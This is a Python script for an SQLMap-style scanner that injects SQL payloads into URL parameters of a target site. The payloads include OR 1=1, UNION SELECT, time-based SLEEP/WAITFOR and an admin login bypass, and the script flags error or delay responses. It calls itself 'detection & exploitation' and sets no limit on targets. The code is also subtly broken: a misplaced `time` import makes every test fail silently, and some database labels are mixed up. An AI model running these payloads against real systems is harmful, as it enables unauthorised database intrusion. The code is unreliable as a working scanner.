"""SQL Injection detection & exploitation - SQLMap style"""

import requests
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

class SQLiEngine:
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
        
        self.test_payloads = [
            ("'", "Single quote"),
            ("' OR '1'='1", "OR true"),
            ("' OR 1=1--", "OR 1=1 comment"),
            ("1' AND SLEEP(5)--", "Time-based (MySQL)"),
            ("'; WAITFOR DELAY '0:0:5'--", "Time-based (MSSQL)"),
            ("1' ORDER BY 1--", "Order by 1"),
            ("1' ORDER BY 10--", "Order by 10"),
            ("' UNION SELECT NULL--", "UNION NULL"),
            ("' UNION SELECT 1,2,3--", "UNION columns"),
            ("admin'--", "Admin bypass"),
        ]
        
        self.db_errors = {
            "MySQL": ["SQL syntax", "MySQL", "mysql_fetch", "ORA-", "SQLSTATE"],
            "MSSQL": ["Microsoft SQL", "SQL Server", "Driver", "SQLOLEDB"],
            "Oracle": ["ORA-", "Oracle", "PL/SQL"],
            "PostgreSQL": ["PostgreSQL", "psycopg2", "PG::"],
            "SQLite": ["SQLite", "sqlite_master", "sqlite3"]
        }
    
    def _extract_params(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return parsed, params
    
    def _test_injection(self, url, param, original_val, payload, db_name):
        parsed, params = self._extract_params(url)
        params[param] = [original_val + payload]
        test_url = parsed._replace(query=urllib.parse.urlencode(params, doseq=True))
        test_url = urllib.parse.urlunparse(test_url)
        
        try:
            start = time.time()
            r = self.session.get(test_url, timeout=12)
            elapsed = time.time() - start
            
            # Check for errors
            for db, patterns in self.db_errors.items():
                for p in patterns:
                    if p.lower() in r.text.lower():
                        self.vulnerabilities.append({
                            'param': param, 'payload': payload, 'db': db,
                            'url': test_url, 'type': 'error-based'
                        })
                        return True, db
            
            # Time-based detection
            if 'SLEEP' in payload or 'WAITFOR' in payload:
                if elapsed >= 4.5:
                    self.vulnerabilities.append({
                        'param': param, 'payload': payload, 'db': db_name or 'Unknown',
                        'url': test_url, 'type': 'time-based'
                    })
                    return True, 'time-based'
            
            # Boolean-based (content difference)
            if len(r.text) > 0:
                return None, None
                
        except:
            pass
        return None, None
    
    def run(self, url):
        import time
        
        print(f"\n=== SQL Injection Scanner: {url} ===")
        parsed, params = self._extract_params(url)
        
        if not params:
            print("[-] No parameters found in URL")
            return []
        
        for param, values in params.items():
            original = values[0] if values else '1'
            print(f"  Testing parameter: {param}")
            
            for payload, db_name in self.test_payloads:
                result, db = self._test_injection(url, param, original, payload, db_name)
                if result:
                    print(f"  [VULNERABLE] Parameter: {param}")
                    print(f"    Payload: {original}{payload}")
                    print(f"    DB Type: {db}")
                    print(f"    URL: {url}")
        
        if not self.vulnerabilities:
            print("[-] No SQL injection detected")
        else:
            print(f"\n[+] {len(self.vulnerabilities)} vulnerabilities found")
        
        return self.vulnerabilities